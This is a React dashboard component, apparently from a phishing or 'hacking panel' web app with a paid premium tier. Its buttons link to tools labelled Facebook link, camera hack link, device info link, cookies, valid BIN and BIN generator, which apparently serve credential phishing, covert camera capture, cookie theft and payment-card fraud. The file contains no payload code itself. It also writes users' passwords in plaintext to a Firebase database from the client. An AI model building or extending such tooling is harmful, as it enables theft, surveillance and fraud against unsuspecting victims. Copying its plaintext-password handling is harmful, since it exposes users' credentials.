
import { NavLink, useNavigate, useParams } from "react-router-dom"
import useRoutProtect from "../../../CUSTOMHOOK/useRoutProtect";
import { auth, database } from "../../../DATABASE/Config";
import Profile from "../USERPROFILE/Profile";
import { useEffect, useState } from "react";
import { onValue, ref, set } from "firebase/database";
import { confirmAlert } from "react-confirm-alert";
import "react-confirm-alert/src/react-confirm-alert.css";
import SocialMedia from "../../SOCIALMEDIA/SocialMedia";



const Home = () => {
  const {uid} = useParams();
  const [notice, setNotice] = useState('')
  const loginNavigate = useNavigate();
  const [users, setUsers] = useState([]);
  const [isPremium, setIsPremium] = useState(false);
  const navigateContact = useNavigate()

  useRoutProtect(auth, uid, loginNavigate)

  useEffect(() => {
    const dbRef = ref(database, 'notice');
    onValue(dbRef, (snapshot) => {
      setNotice(snapshot.val());
    })
  },[])

  useEffect(() => {
    const dbRef = ref(database, 'userInfo');
    onValue(dbRef, (snapshot) => {
      const userArray = [];
      snapshot.forEach((items) => {
        userArray.push(items.val())
      })
      setUsers(userArray)
      userArray.forEach((items) => {

        if(!items.premiumExpiration || items.premiumExpiration == null || items.premiumExpiration == undefined || items.premiumExpiration <= 0){
          
          setIsPremium(false);
        }else if (items.premiumExpiration && items.premiumExpiration >= 0) {
          setIsPremium(true)
        }

        if(items?.premiumExpiration === items?.validity || items?.premiumExpiration <=0){
          set(ref(database, `userInfo/${items.uid}`),{
            email: items.email,
            name: items.name,
            password: items.password,
            phone: items.phone,
            picture: items.picture,
            uid: items.uid
          })
        }
      })
    })
  },[])

  useEffect(() => {
    // const interval = setInterval(() => {
      users.forEach((items) => {
        const now = new Date();
        const avail = items.premiumExpiration - now.getTime();
        if(avail <= 0){
          set(ref(database, `userInfo/${items.uid}`),{
            email: items.email,
            name: items.name,
            password: items.password,
            phone: items.phone,
            picture: items.picture,
            uid: items.uid
          })
        }
  
        if(items?.premiumExpiration){
          set(ref(database, `/userInfo/${items.uid}`),{
            email: items.email,
            name: items.name,
            password: items.password,
            phone: items.phone,
            picture: items.picture,
            uid: items.uid,
            premiumExpiration: items.premiumExpiration,
            validity: avail
          })
        }
      })
    // }, 2000);

    // return () => clearInterval(interval)

  },[])

  const handleAlert = () => {
    confirmAlert({
      title: "premium",
      message: "You are not premium user. for premium service contact with admin",
      buttons:[
        {
          label: "contact admin",
          onClick: () => navigateContact('/contact')
        },
        {
          label: "Close"
        }
      ]
    })
  }
  return (
    <div>
      <Profile uid = {uid} premium = {isPremium} />
      
      <div >
        {notice && (
          <div className="flex w-full p-5 items-center">
          <h1 className="font-bold">Notice:</h1>
          <marquee className="font-lobster font-bold text-red-700 mx-2 text-2xl">{notice.notice}</marquee>
        </div>
        )}
      </div>
        <div className="h-screen flex items-center justify-center">
        
          <div className="flex flex-wrap w-full items-center justify-center ">
          <NavLink to={`/facebook/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Facebook preview</NavLink>
            <NavLink to={`/facebookLink/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700" >Facebook link</NavLink>

            <NavLink to={`/youtube/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Camera preview</NavLink>
            <NavLink to={`/cameraHack/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Camera link</NavLink>

            <NavLink to={`/youtub/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Device preview</NavLink>
            <NavLink to={`/deviceInfo/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Device link</NavLink>

            <NavLink to={`/cookies/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700" >Cookies</NavLink>

            <NavLink to={`/bin/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Valid Bin</NavLink>
            <NavLink to={'/generateBin'} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Generate Bin</NavLink>
            {isPremium ? <NavLink to={`/premium/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Premium</NavLink> : <button onClick={handleAlert} className="bg-rose-700 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border">Premium</button>}

            <NavLink to={'/contact'} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Report to admin</NavLink>

            <NavLink to={'/chat'} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Global chat</NavLink>
            
          </div>
        </div>
        <div>
          <SocialMedia />
        </div>
    </div>
  )
}

export default Home